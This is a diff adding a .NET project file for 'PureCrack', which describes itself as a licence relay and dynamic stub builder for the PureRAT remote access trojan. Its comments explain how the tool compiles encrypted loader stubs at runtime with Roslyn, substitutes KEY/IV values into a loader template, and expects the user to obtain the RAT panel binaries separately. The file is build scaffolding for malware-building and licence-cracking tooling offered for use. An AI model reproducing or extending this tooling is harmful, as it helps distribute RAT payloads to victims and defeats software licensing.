@@ -1,0 +1,110 @@
+<Project Sdk="Microsoft.NET.Sdk">
+
+  <PropertyGroup>
+    <OutputType>Exe</OutputType>
+    <TargetFramework>net472</TargetFramework>
+    <AssemblyName>PureCrack</AssemblyName>
+    <RootNamespace>PureCrack</RootNamespace>
+    <LangVersion>10</LangVersion>
+    <Nullable>enable</Nullable>
+    <Deterministic>true</Deterministic>
+    <Platforms>x64</Platforms>
+    <PlatformTarget>x64</PlatformTarget>
+    <ApplicationManifest>app.manifest</ApplicationManifest>
+    <NoWarn>CS8002</NoWarn>
+    <AppendTargetFrameworkToOutputPath>false</AppendTargetFrameworkToOutputPath>
+    <Version>2.0.0</Version>
+    <Product>PureCrack</Product>
+    <Description>PureRAT v4.0.9596 licence relay + dynamic stub builder.</Description>
+  </PropertyGroup>
+
+  <!--
+    Roslyn for in-process C# compilation of the inner DLL and outer Loader EXE.
+    Replaces the csc.exe shell-out the Python kit used.
+  -->
+  <ItemGroup>
+    <PackageReference Include="Microsoft.CodeAnalysis.CSharp" Version="4.8.0" />
+    <!-- For reading + reordering the panel's Settings.json (IPs auto-fix). -->
+    <PackageReference Include="System.Text.Json" Version="8.0.5" />
+    <PackageReference Include="Costura.Fody" Version="5.7.0">
+      <PrivateAssets>all</PrivateAssets>
+    </PackageReference>
+    <PackageReference Include="Fody" Version="6.8.0">
+      <PrivateAssets>all</PrivateAssets>
+    </PackageReference>
+  </ItemGroup>
+
+  <!--
+    Inner DLL sources are EMBEDDED, not COMPILED into PureCrack.exe itself.
+    They're handed to Roslyn at runtime to build the inner DLL inside the stub.
+    Without this Remove, Microsoft.NET.Sdk's implicit Compile glob picks them up
+    and the build fails because they reference protobuf-net types we don't have
+    on the main project's reference list.
+  -->
+  <ItemGroup>
+    <Compile Remove="assets\**\*.cs" />
+  </ItemGroup>
+
+  <!--
+    Embedded resources:
+      assets/inner/*.cs            — 32 inner DLL source files (panel-side runtime).
+      assets/inner/Loader.tmpl     — outer EXE template, KEY/IV substituted at build time.
+
+    Binary dependencies (protobuf-net.dll, compile_response.bin) are not
+    included in this repo — download the full kit or acquire them separately
+    (see README.md).
+  -->
+  <ItemGroup>
+    <None Remove="assets\**" />
+    <Content Remove="assets\**" />
+    <EmbeddedResource Include="assets\inner\*.cs" />
+    <EmbeddedResource Include="assets\inner\Loader.tmpl">
+      <LogicalName>PureCrack.assets.inner.Loader.tmpl</LogicalName>
+    </EmbeddedResource>
+  </ItemGroup>
+
+  <ItemGroup>
+    <Reference Include="System.Net.Http" />
+    <!-- For ProtectedData / DPAPI used to wrap relay+agent PFX on disk. -->
+    <Reference Include="System.Security" />
+  </ItemGroup>
+
+  <!--
+    Panel files (PureRAT.exe, data.pak, Plugins/) are NOT included in this repo.
+    See panel/README.md for instructions on acquiring them.
+    Before building, place PureRAT.exe + supporting files in panel/ yourself
+    (or set PURE_PANEL_EXE env var at runtime to point at an existing install).
+    If you have the panel files, uncomment the block below:
+  -->
+  <!--
+  <ItemGroup>
+    <None    Remove="panel\**" />
+    <Content Remove="panel\**" />
+    <Content Include="panel\PureRAT.exe">
+      <Link>panel\PureRAT.exe</Link>
+      <CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory>
+    </Content>
+    <Content Include="panel\PureRAT.exe.config">
+      <Link>panel\PureRAT.exe.config</Link>
+      <CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory>
+    </Content>
+    <Content Include="panel\data.pak">
+      <Link>panel\data.pak</Link>
+      <CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory>
+    </Content>
+    <Content Include="panel\data\GeoIP.mmdb">
+      <Link>panel\data\GeoIP.mmdb</Link>
+      <CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory>
+    </Content>
+    <Content Include="panel\Plugins\PureHelper.dll">
+      <Link>panel\Plugins\PureHelper.dll</Link>
+      <CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory>
+    </Content>
+    <Content Include="panel\Plugins\PureHelper.Client.dll">
+      <Link>panel\Plugins\PureHelper.Client.dll</Link>
+      <CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory>
+    </Content>
+  </ItemGroup>
+  -->
+
+</Project>
